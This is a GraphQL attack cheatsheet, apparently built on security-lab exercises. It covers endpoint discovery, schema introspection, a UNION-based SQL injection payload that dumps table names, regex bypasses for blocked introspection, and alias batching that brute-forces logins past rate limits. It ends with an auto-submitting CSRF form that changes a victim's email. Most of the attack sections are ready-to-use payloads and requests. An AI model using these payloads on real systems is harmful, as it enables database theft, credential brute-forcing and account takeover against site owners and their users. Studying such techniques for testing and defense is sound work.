# PSG cheatsheet:

## 1. Finding GraphQL endpoints

Typical GraphQL endpoints:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`
- `/gql`
- `/v1/graphql`

**Tips**

- If these common endpoints don't return a GraphQL response, try appending `/v1` to the path.
- Use tools like Burp Suite, ffuf, or dirsearch to brute-force possible endpoint paths.
- Look for JavaScript files in the web app that call `.fetch('/graphql')`, etc.
- Check Network tab (DevTools) when performing actions in the app.

## 2. Identify GraphQL services

Use **Universal queries** to check if graphQL is used. (Expected response: `{"data": {"__typename": "query"}}`):

```
# graphQL:

query { __typename }
```

```
# Request:

{
  "query": "query { __typename }"
}
```

**Tips:**

- Try query `{ __schema { queryType { name } } }` if it allows introspection.
- Also test `POST` vs `GET` — most GraphQL APIs use `POST` for queries.

## 3. Consider the request methods

If step 2 fail, try afltering the request method and headers:

- `POST`
- `application/json`
- `x-www-form-urlencoded`
- `GET`

Also, try sending a malformed body to test how the server responds

## 4. Discovering schema information

**(using introspection)**


### 4.1 - Get Entry Points (Root Operation Types)

```graphql
query {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```

This tells you the names of the **root types**, e.g., `Query`, `Mutation`, `Subscription`. Usually:

* `Query` = for reading data
* `Mutation` = for writing data
* `Subscription` = for real-time (optional)

---

### 4.2 - List Fields of a Root Type 

Assuming that we found a **Root type** from previous step: (e.g., `query`)

**Note:** case sensitive

```graphql
query {
  __type(name: "query") {
    fields {
      name
      description
    }
  }
}
```

This shows all **available queries**, like:

```json
{
  "fields": [
    { "name": "user" },
    { "name": "products" },
    { "name": "getProductById" }
  ]
}
```

---

### 4.3 - Explore Fields in Depth

Now that you know a query field (like `getProductById`), check its **arguments and return type**:

```graphql
query {
  __type(name: "Query") {
    fields {
      name
      args {
        name
        description
        type {
          name
          kind
        }
      }
      type {
        name
        kind
      }
    }
  }
}
```

You’ll find things like:

```json
{
  "name": "getProductById",
  "args": [{ "name": "id", "type": { "name": null, "kind": "NON_NULL" } }],
  "type": { "name": "Product", "kind": "OBJECT" }
}
```

---

### 4.4 - Investigate Return Types 

Assuming you found a **Type** from previous step: (e.g., `Product`)

```graphql
query {
  __type(name: "Product") {
    kind
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

This gives you the **shape of the response**. Now you know what fields to ask for when querying.

---

### 4.5 - Dive into Input Types (for Mutations)

If a mutation takes an input object:

```graphql
mutation {
  createProduct(input: { ... }) {
    ...
  }
}
```

Check the **input object definition** like this:

```graphql
query {
  __type(name: "CreateProductInput") {
    kind
    inputFields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

### 4.7 - Summary: Schema Enumeration Tree

Here’s a visual breakdown of what you're doing:

```
__schema
├── queryType → name = "Query"
│   └── __type(name: "Query")
│       └── fields[]
│           ├── name
│           ├── args[]
│           └── type → points to OBJECT → __type(name: "ObjectName")
│
├── mutationType → same process
└── subscriptionType → same process (if present)
```

- Abuse `me` vs `user(id: ...)` queries

## 8. Injection Testing (SQLi, NoSQLi, XSS in GraphQL)

GraphQL isn't immune to classic bugs:

- SQL Injection in inputs
- XSS in string fields
- GraphQL-specific abuse like alias spam, batching attacks

**SQL Injection Example:**

Using the introspection query discussed earlier and some trial-and-error, we can identify that the backend supports the following queries that require arguments:
* `post`
* `user`
* `postByAuthor`

To identify if a query requires an argument, we can send the query without any arguments and analyze the response. If the backend expects an argument, the response contains an error that tells us the name of the required argument. For instance, the following error message tells us that the `postByAuthor` query requires the `author` argument:

<img width="1546" height="634" alt="image" src="https://github.com/user-attachments/assets/c845568e-fee9-40a9-a0fc-ae617277a6a3" />

After supplying the `author` argument, the query is executed successfully:

<img width="1540" height="560" alt="image" src="https://github.com/user-attachments/assets/f94af3f1-f0ba-48cc-950a-43a0ec7edcb3" />

We can now investigate whether the `author` argument is vulnerable to SQL injection. For instance, if we try a basic SQL injection payload, the query does not return any result:

<img width="1549" height="407" alt="image" src="https://github.com/user-attachments/assets/b0439faf-fba7-413f-a8c9-f5e73c5a1382" />

Let us move on to the `user` query. If we try the same payload there, the query still returns the previous result, indicating a SQL injection vulnerability:

<img width="1546" height="507" alt="image" src="https://github.com/user-attachments/assets/ef75c9f3-e32e-4072-90c8-284c6c4b9f0f" />

If we simply inject a single quote, the response contains a SQL error, confirming the vulnerability:

<img width="1541" height="636" alt="image" src="https://github.com/user-attachments/assets/7d6a781b-e689-4815-b809-96bdc07188b7" />

Since the SQL query is displayed in the SQL error, we can construct a UNION-based SQL injection query to exfiltrate data from the SQL database. Remember that the database might contain data that we cannot query from the GraphQL API. As such, we should check for any sensitive data in the database that we can access.

To construct a UNION-based SQL injection payload, let us take another look at the results of the introspection query:

<img width="1256" height="586" alt="image" src="https://github.com/user-attachments/assets/60005ec0-4031-43dc-b602-d92c00166de1" />

The vulnerable `user` query returns a `UserObject`, so let us focus on that object. As we can see, the object consists of six fields and a link (`posts`). The fields correspond to columns in the database table. As such, our UNION-based SQL injection payload needs to contain six columns to match the number of columns in the original query. Furthermore, the fields we specify in our GraphQL query correspond to the columns returned in the response. For instance, since the `username` is a `UserObject`'s third field, querying for the `username` will result in the third column of our UNION-based payload being reflected in the response.

As the GraphQL query only returns the first row, we will use the `GROUP_CONCAT` function to exfiltrate multiple rows at a time. This enables us to exfiltrate all table names in the current database with the following payload:

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

The **response** contains all table names concatenated in the `username` field:

```graphql
{
  "data": {
    "user": {
      "username": "user,secret,post"
    }
  }
}
```


# Bypass

## 1. Bypassing GraphQL introspection defenses (bad regex)

If introspection queries fail, insert special characters after `__schema` (spaces, newlines, commas) since GraphQL ignores them but flawed regex might not. For example, if developers only block `__schema{`, this works:

```
{"query": "query{__schema\n{queryType{name}}}"}
```

Also try alternative request methods - use GET or POST with `x-www-form-urlencoded` content-type if introspection is only disabled over standard POST:

```
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

## 2. Bypassing rate limiting using aliases

GraphQL aliases let you return multiple instances of the same object in one request by explicitly naming properties. While designed to reduce API calls, they can bypass rate limiters that count HTTP requests rather than operations performed.

Since aliases allow multiple queries in a single HTTP request, you can potentially brute force endpoints that would otherwise be rate limited. For example:

```graphql
query isValidDiscount($code: Int) {
  isvalidDiscount(code:$code){ valid }
  isValidDiscount2:isValidDiscount(code:$code){ valid }
  isValidDiscount3:isValidDiscount(code:$code){ valid }
}
```

This single HTTP request checks multiple discount codes simultaneously, potentially bypassing rate limits based on request count rather than operation count.

**Use a script to build the request**

```
mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...
}
```

## 3. CSRF over GraphQL

CSRF vulnerabilities occur when GraphQL endpoints don't validate content types and lack CSRF tokens.

POST requests with `application/json` are naturally protected since browsers can't send this content type from malicious sites (assuming proper validation). However, GET requests or POST requests with `x-www-form-urlencoded` content type can be triggered by browsers, making users vulnerable if the endpoint accepts these methods.

When endpoints accept these alternative request types, attackers can craft exploits to send malicious requests through victims' browsers to the GraphQL API.

```
<html>
  <body>
    <form method="POST" action="https:asdasd/graphql/v1">
      <input type="hidden" name="query" value='mutation { changeEmail(input: { email: "asd1@asd" }) { email } }' />
      <input type="submit" value="Submit">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Note:** Change email and send it 3 times.
